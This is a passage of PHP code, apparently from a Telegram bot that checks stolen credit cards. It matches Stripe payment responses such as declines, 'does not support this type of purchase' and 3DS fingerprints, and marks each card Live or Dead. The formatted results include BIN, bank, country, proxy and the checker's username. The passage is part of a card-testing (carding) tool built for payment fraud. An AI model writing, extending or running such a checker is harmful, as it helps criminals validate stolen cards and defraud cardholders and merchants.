[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ↯ <code>$name $emoji</code>
━━━━━━━━━━━━━━━━━━
[↯] 𝗣𝗥𝗢𝗫𝗬 ↯ <code>$r.XXX.XXX.XX Live ✅</code>
[↯] 𝗧𝗜𝗠𝗘 ↯ <code>$time seconds</code> 
[↯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ↯ @$username <code>[$rank]</code>

</b>";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}

elseif(strpos($result3, "Your card does not support this type of purchase.")) {
$resp = "<b>
𝘾𝘾𝙉 𝘾𝙃𝘼𝙉𝙂𝙀 0.7$ ✅
═════『』═════
━━━━━━━━━━━━━━━━━━
[↯] 𝗖𝗖 ★ <code>$lista</code>
[↯] 𝗦𝗧𝗔𝗧𝗨𝗦 ★ <code> Live 🟢 </code>
[↯] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ★ <code> Your card does not support this type of purchase.</code>
━━━━━━━━━━━━━━━━━━
[↯] 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼 ↯<code>$bank</code>
[↯] 𝗕𝗮𝗻𝗸 ↯ <code>$brand</code>
[↯] 𝗧𝗬𝗣𝗘 ↯ <code>$type</code>
[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ↯ <code>$name $emoji</code>
━━━━━━━━━━━━━━━━━━
[↯] 𝗣𝗥𝗢𝗫𝗬 ↯ <code>$r.XXX.XXX.XX Live ✅</code>
[↯] 𝗧𝗜𝗠𝗘 ↯ <code>$time seconds</code> 
[↯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ↯ @$username <code>[$rank]</code>


</b>";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}

elseif(strpos($result3, "stripe_3ds2_fingerprint")) {
$resp = "<b>
𝘾𝘾𝙉 𝘾𝙃𝘼𝙉𝙂𝙀 0.7$ ✅
═════『』═════
━━━━━━━━━━━━━━━━━━
[↯] 𝗖𝗖 ★ <code>$lista</code>
[↯] 𝗦𝗧𝗔𝗧𝗨𝗦 ★ <code> Live 🟢 </code>
[↯] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ★ <code>3D_Req </code>
━━━━━━━━━━━━━━━━━━
[↯] 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼 ↯<code>$bank</code>
[↯] 𝗕𝗮𝗻𝗸 ↯ <code>$brand</code>
[↯] 𝗧𝗬𝗣𝗘 ↯ <code>$type</code>
[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ↯ <code>$name $emoji</code>
━━━━━━━━━━━━━━━━━━
[↯] 𝗣𝗥𝗢𝗫𝗬 ↯ <code>$r.XXX.XXX.XX Live ✅</code>
[↯] 𝗧𝗜𝗠𝗘 ↯ <code>$time seconds</code> 
[↯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ↯ @$username <code>[$rank]</code>


</b>";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}
elseif(strpos($result3, "card was declined.")) {
$resp = "<b>
𝘾𝘾𝙉 𝘾𝙃𝘼𝙉𝙂𝙀 0.7$ ❌
━━━━━━━━━━━━━━━━━━
[↯] 𝗖𝗖 ★ <code>$lista</code>
[↯] 𝗦𝗧𝗔𝗧𝗨𝗦 ★ Dead 🔴
[↯] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ★ <code>$msg </code>
━━━━━━━━━━━━━━━━━━
[↯] 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼 ↯<code>$bank</code>
[↯] 𝗕𝗮𝗻𝗸 ↯ <code>$brand</code>
[↯] 𝗧𝗬𝗣𝗘 ↯ <code>$type</code>
[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ↯ <code>$name $emoji</code>
━━━━━━━━━━━━━━━━━━
[↯] 𝗣𝗥𝗢𝗫𝗬 ↯ <code>$r.XXX.XXX.XX Live ✅</code>
[↯] 𝗧𝗜𝗠𝗘 ↯ <code>$time seconds</code> 
[↯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ↯ @$username <code>[$rank]</code>


  </b>";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}

else {
$resp = "<b>
𝘾𝘾𝙉 𝘾𝙃𝘼𝙉𝙂𝙀 0.7$ ❌
━━━━━━━━━━━━━━━━━━
[↯] 𝗖𝗖 ★ <code>$lista</code>
[↯] 𝗦𝗧𝗔𝗧𝗨𝗦 ★ Dead 🔴
[↯] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ★ <code>$msg </code>
━━━━━━━━━━━━━━━━━━
[↯] 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼 ↯<code>$bank</code>
[↯] 𝗕𝗮𝗻𝗸 ↯ <code>$brand</code>
[↯] 𝗧𝗬𝗣𝗘 ↯ <code>$type</code>
[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ↯ <code>$name $emoji</code>
━━━━━━━━━━━━━━━━━━
[↯] 𝗣𝗥𝗢𝗫𝗬 ↯ <code> $r.XXX.XXX.XX Live ✅</code>
[↯] 𝗧𝗜𝗠𝗘 ↯ <code>$time seconds</code> 
[↯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ↯ @$username <code>[$rank]</code>


  </b>";
sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}
}